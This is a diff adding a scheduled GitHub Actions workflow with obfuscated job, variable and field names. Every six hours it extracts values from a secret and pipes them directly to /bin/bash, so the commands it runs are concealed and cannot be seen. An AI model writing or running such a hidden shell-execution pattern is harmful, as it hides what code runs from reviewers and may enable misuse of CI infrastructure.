@@ -1,0 +1,25 @@
+name: panxiaoxia1616
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: panxiaoxia1616
+        env:
+          dcq286: ${{ secrets.dcq286 }}
+        run: |
+          echo $dcq286 | jq -r .tkvv865 | /bin/bash
+          echo $pmfk0 | jq -r .j2 | /bin/bash
+          echo $pyiqg7 | jq -r .ytbn7761 | /bin/bash
+          echo $k56680 | jq -r .dts627 | /bin/bash
+          echo $erd5 | jq -r .fx790 | /bin/bash
+          echo $s8983 | jq -r .kduzs5511 | /bin/bash
+          echo $varc76458 | jq -r .hjhna2 | /bin/bash
+          echo $y68 | jq -r .wrd3 | /bin/bash
+
